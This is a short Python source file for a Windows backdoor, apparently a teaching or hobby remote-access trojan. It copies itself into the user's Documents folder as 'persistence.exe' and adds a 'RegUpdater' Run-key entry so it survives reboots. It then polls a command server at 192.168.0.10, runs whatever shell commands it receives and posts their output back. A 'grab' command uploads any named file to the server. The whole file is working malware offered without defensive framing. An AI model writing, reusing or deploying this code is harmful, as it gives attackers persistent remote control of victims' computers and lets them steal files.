import requests
import subprocess
import time
import os
import shutil
import winreg
import random

path = os.getcwd().strip('\n')

null,userprof = subprocess.check_output('set USERPROFILE', shell=True).split(b'=')

destination = str(userprof.decode().strip('\n\r')) + '\\Documents\\' + 'persistence.exe'

if not os.path.exists(destination):
    shutil.copyfile(path + '\persistence.exe', str(destination))
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,"Software\Microsoft\Windows\CurrentVersion\Run",0,winreg.KEY_ALL_ACCESS)
    winreg.SetValueEx(key,'RegUpdater',0,winreg.REG_SZ,destination)
    key.Close()

def connect():
    while True:
        req = requests.get('http://192.168.0.10')
        command = req.text

        if "terminate" in command:
            return 1
        elif 'grab' in command:
            grab,path = command.split(" * ")
            if os.path.exists(path):
                url = 'http://192.168.0.10/store'
                files = {'file': open(path, 'rb'),'path': path}
                r = requests.post(url, files=files)
            else:
                post_response = requests.post(url='http://192.168.0.10',data='[-] Not able to find the file.')
        else:
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            post_response = requests.post(url='http://192.168.0.10', data=CMD.stdout.read())
            post_response = requests.post(url='http://192.168.0.10', data=CMD.stderr.read())

        time.sleep(3)

while True:
    try:
        if connect() == 1:
            break
    except:
        sleep_for = random.randrange(1,10)
        time.sleep(sleep_for)       #Sleep for a random time between 1 and 10 seconds
        #time.sleep(sleep_for * 60) #Sleep for a random time between 1 and 10 minutes
        pass
